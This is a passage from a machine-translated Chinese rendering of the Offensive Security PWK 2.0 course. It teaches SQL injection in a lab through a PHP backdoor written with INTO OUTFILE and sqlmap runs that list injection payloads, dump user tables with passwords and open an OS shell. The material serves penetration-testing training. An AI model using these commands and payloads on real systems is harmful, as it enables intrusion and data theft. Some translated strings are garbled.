<div style="position:absolute;top:22161;left:216"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 334 - 使用 OUTFILE 函数编写 PHP shell 的 SQL 注入负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果成功，则该文件应放置在 Web 根目录中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:22373;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 175：利用 SQL 注入编写 PHP Shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此命令会产生一条错误消息，但这并不一定意味着文件创建是</font></font></nobr></div>
<div style="position:absolute;top:22424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不成功。</font><font style="vertical-align: inherit;">让我们尝试使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">访问新创建的 backdoor.php 页面，</font><font style="vertical-align: inherit;">例如</font></font></nobr></div>
<div style="position:absolute;top:22443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22780;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:23857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:23857;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:23857;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">340</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23036;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 176：使用后门 PHP 命令外壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">我们现在已经将我们的 SQL 注入漏洞转化为服务器上的代码执行。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:23086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过安装 webshel​​l 轻松地将其扩展为完整的 shell 访问。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23121;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.11 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.利用SQL注入和MariaDB INTO OUTFILE函数获取代码</font></font></nobr></div>
<div style="position:absolute;top:23170;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。</font></font></nobr></div>
<div style="position:absolute;top:23199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.把简单的代码执行变成一个完整的shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23233;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.5.12 自动化 SQL 注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们所遵循的 SQL 注入过程可以在几个工具的帮助下自动化</font></font></nobr></div>
<div style="position:absolute;top:23287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装在 Kali Linux 中。</font><font style="vertical-align: inherit;">一个更值得注意的工具之一是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SqlMap的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">289</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以用来识别和</font></font></nobr></div>
<div style="position:absolute;top:23306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对各种数据库引擎利用 SQL 注入漏洞。</font></font></nobr></div>
<div style="position:absolute;top:23339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们在示例 Web 应用程序上使用 sqlmap。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:23359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定要测试的参数</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"</font></font></font></b></nobr></div>
<div style="position:absolute;top:23410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:23427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:53:45] [INFO] 启发式（基本）测试表明 GET 参数“id”可能是 </font></font></nobr></div>
<div style="position:absolute;top:23444;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可注射（可能的 DBMS：'MySQL'）</font></font></nobr></div>
<div style="position:absolute;top:23461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:53:45] [INFO] 启发式 (XSS) 测试表明 GET 参数“id”可能是 </font></font></nobr></div>
<div style="position:absolute;top:23478;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">容易受到跨站脚本 (XSS) 攻击</font></font></nobr></div>
<div style="position:absolute;top:23495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:53:45] [INFO] 在 GET 参数“id”上测试 SQL 注入</font></font></nobr></div>
<div style="position:absolute;top:23512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来后端 DBMS 是“MySQL”。</font><font style="vertical-align: inherit;">你想跳过特定的测试有效载荷吗</font></font></nobr></div>
<div style="position:absolute;top:23529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于其他 DBMS？</font><font style="vertical-align: inherit;">[Y / N] </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:23546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于剩余的测试，您是否要包括“MySQL”扩展提供的所有测试</font></font></nobr></div>
<div style="position:absolute;top:23563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ed 级别 (1) 和风险 (1) 值？</font><font style="vertical-align: inherit;">[Y / N] </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:23580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:53:57] [INFO] 测试“AND 布尔型盲 - WHERE 或 HAVING 子句”</font></font></nobr></div>
<div style="position:absolute;top:23597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">…</font></font></nobr></div>
<div style="position:absolute;top:23614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sqlmap 确定了以下注入点，总共有 47 个 HTTP(s) 请求：</font></font></nobr></div>
<div style="position:absolute;top:23631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:23648;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数：id (GET)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23665;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型：基于布尔值的盲注</font></font></nobr></div>
<div style="position:absolute;top:23682;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题：AND 基于布尔值的盲注 - WHERE 或 HAVING 子句</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:23699;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷：id=1 AND 8867=8867</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:23733;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型：基于错误</font></font></nobr></div>
<div style="position:absolute;top:23750;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题：MySQL &gt;= 5.0 AND 基于错误 - WHERE、HAVING、ORDER BY 或 GROUP BY 子句（</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:23807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">289 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（sqlmap，2019），http://sqlmap.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:23935;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:23968;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:25045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:25045;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:25045;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">341</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地面）</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24080;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载：id=1 AND (SELECT 6734 FROM(SELECT COUNT(*),CONCAT(0x71716a6a71,(SELECT (E)</font></font></b></nobr></div>
<div style="position:absolute;top:24097;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LT(6734=6734,1))),0x716a6b7171,FLOOR(RAND(0)*2))x 来自 INFORMATION_SCHEMA.PLUGINS GROU</font></font></b></nobr></div>
<div style="position:absolute;top:24114;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">P BY x)a)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24148;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型：基于时间的盲注</font></font></nobr></div>
<div style="position:absolute;top:24165;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题：MySQL &gt;= 5.0.12 AND 基于时间的盲注</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24182;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载：id=1 AND SLEEP(5)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24216;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型：UNION 查询</font></font></nobr></div>
<div style="position:absolute;top:24233;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题：通用 UNION 查询 (NULL) - 3 列</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24250;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载：id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71716a6a71,0x6768746c4a4b5769685</font></font></b></nobr></div>
<div style="position:absolute;top:24267;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">07871586a764c4b4352594367685371725045706f6d456a54727a4b4a686d,0x716a6b7171)--peGa</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---</font></font></nobr></div>
<div style="position:absolute;top:24301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:54:11] [INFO] 后端 DBMS 是 MySQL</font></font></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:24318;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络服务器操作系统：Windows</font></font></b></nobr></div>
<div style="position:absolute;top:24335;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络应用技术：Apache 2.4.37、PHP 7.0.33</font></font></b></nobr></div>
<div style="position:absolute;top:24352;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后端 DBMS：MySQL &gt;= 5.0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:54:11] [INFO] 获取记录到“/home/kali/.sqlmap/output/1”下的文本文件的数据</font></font></nobr></div>
<div style="position:absolute;top:24386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.11.0.22'</font></font></nobr></div>
<div style="position:absolute;top:24405;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 335 - 示例 sqlmap 用法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果参数易受 SQL 注入攻击，Sqlmap 将发出多个请求来探测。</font><font style="vertical-align: inherit;">它也是</font></font></nobr></div>
<div style="position:absolute;top:24454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试确定正在使用的数据库软件，以便它可以将攻击调整为</font></font></nobr></div>
<div style="position:absolute;top:24473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件。</font><font style="vertical-align: inherit;">在这种情况下，它发现了四种不同的技术来利用该漏洞。</font><font style="vertical-align: inherit;">它还列出了一个</font></font></nobr></div>
<div style="position:absolute;top:24493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每种技术的有效载荷。</font><font style="vertical-align: inherit;">即使 sqlmap 为我们做工作，有这些示例</font></font></nobr></div>
<div style="position:absolute;top:24512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷帮助我们了解它是如何利用漏洞的。</font></font></nobr></div>
<div style="position:absolute;top:24545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以使用 sqlmap 自动从数据库中提取数据。</font><font style="vertical-align: inherit;">我们将运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sqlmap</font></font></font></b></nobr></div>
<div style="position:absolute;top:24564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--dbms</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将“MySQL”设置为后端类型，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--dump</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转储所有内容</font></font></nobr></div>
<div style="position:absolute;top:24584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库中的表。</font><font style="vertical-align: inherit;">Sqlmap 在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--dbms</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志中</font><font style="vertical-align: inherit;">支持多个后端数据库，</font><font style="vertical-align: inherit;">但它</font></font></nobr></div>
<div style="position:absolute;top:24603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不区分 MariaDB 和 MySQL。</font><font style="vertical-align: inherit;">设置“MySQL”就足够了</font></font></nobr></div>
<div style="position:absolute;top:24623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于这个例子。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump</font></font></font></b></nobr></div>
<div style="position:absolute;top:24674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:24691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库：webappdb</font></font></nobr></div>
<div style="position:absolute;top:24708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表：反馈</font></font></nobr></div>
<div style="position:absolute;top:24725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2 个条目]</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24742;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+-------------------------------------------- --+------+</font></font></b></nobr></div>
<div style="position:absolute;top:24759;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">身份证 | </font><font style="vertical-align: inherit;">文本    </font></font></b></nobr></div>
<div style="position:absolute;top:24759;left:530"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">姓名 |</font></font></b></nobr></div>
<div style="position:absolute;top:24776;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+-------------------------------------------- --+------+</font></font></b></nobr></div>
<div style="position:absolute;top:24793;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1 | </font><font style="vertical-align: inherit;">今天的炸玉米饼很棒！    </font></font></b></nobr></div>
<div style="position:absolute;top:24793;left:530"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">杰克 |</font></font></b></nobr></div>
<div style="position:absolute;top:24810;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2 | </font><font style="vertical-align: inherit;">如果可以的话，我每天都会在这里吃炸玉米饼！</font><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">约翰 |</font></font></b></nobr></div>
<div style="position:absolute;top:24827;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+-------------------------------------------- --+------+</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:56:58] [INFO]</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 'webappdb.feedback' 转储到 CSV 文件 '/home/kali/.sqlmap/out</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:24878;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">put/10.11.0.22/dump/webappdb/feedback.csv'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:24895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:56:58] [INFO] 为数据库 'webappdb' 中的表 'users' 获取列</font></font></nobr></div>
<div style="position:absolute;top:24912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:56:58] [INFO] 在数据库 'webappdb' 中获取表 'users' 的条目</font></font></nobr></div>
<div style="position:absolute;top:24929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库：webappdb</font></font></nobr></div>
<div style="position:absolute;top:24946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表：用户</font></font></nobr></div>
<div style="position:absolute;top:24963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[2 个条目]</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:24980;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+---------+--------------+</font></font></b></nobr></div>
<div style="position:absolute;top:24997;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">身份证 | </font><font style="vertical-align: inherit;">用户名 | </font><font style="vertical-align: inherit;">密码 |</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:25123;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:25156;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:26233;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:26233;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">342</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:25252;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+---------+--------------+</font></font></b></nobr></div>
<div style="position:absolute;top:25268;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">1 | </font><font style="vertical-align: inherit;">管理员 | </font><font style="vertical-align: inherit;">p@ssw0rd |</font></font></b></nobr></div>
<div style="position:absolute;top:25285;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2 | </font><font style="vertical-align: inherit;">拼图| </font><font style="vertical-align: inherit;">步法诱惑|</font></font></b></nobr></div>
<div style="position:absolute;top:25302;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+----+---------+--------------+</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:56:58] [INFO]</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 'webappdb.users' 转储到 CSV 文件 '/home/kali/.sqlmap/output</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:25353;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/10.11.0.22/dump/webappdb/users.csv'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[13:56:58] [INFO]</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取记录到“/home/kali/.sqlmap/output/1”下的文本文件的数据</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:25387;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.11.0.22'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25407;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 336 - 使用 sqlmap 转储数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据清单 336 中的输出，sqlmap 能够转储整个</font></font></nobr></div>
<div style="position:absolute;top:25455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库。</font><font style="vertical-align: inherit;">除了在终端窗口显示内容外，sqlmap还创建了一个CSV</font></font></nobr></div>
<div style="position:absolute;top:25475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含转储内容的文件。</font></font></nobr></div>
<div style="position:absolute;top:25507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sqlmap 还有很多其他的特性，比如可以尝试 Web Application Firewall (WAF)</font></font></nobr></div>
<div style="position:absolute;top:25527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过并执行复杂的查询以自动完成服务器的完全接管。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:25546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">os-shell</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数将尝试自动上传和执行远程</font></font></nobr></div>
<div style="position:absolute;top:25566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标系统上的命令 shell。</font></font></nobr></div>
<div style="position:absolute;top:25598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--os-shell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 sqlmap</font><font style="vertical-align: inherit;">在系统上执行</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">shell</font></font></b><font style="vertical-align: inherit;">来</font><font style="vertical-align: inherit;">使用此功能</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
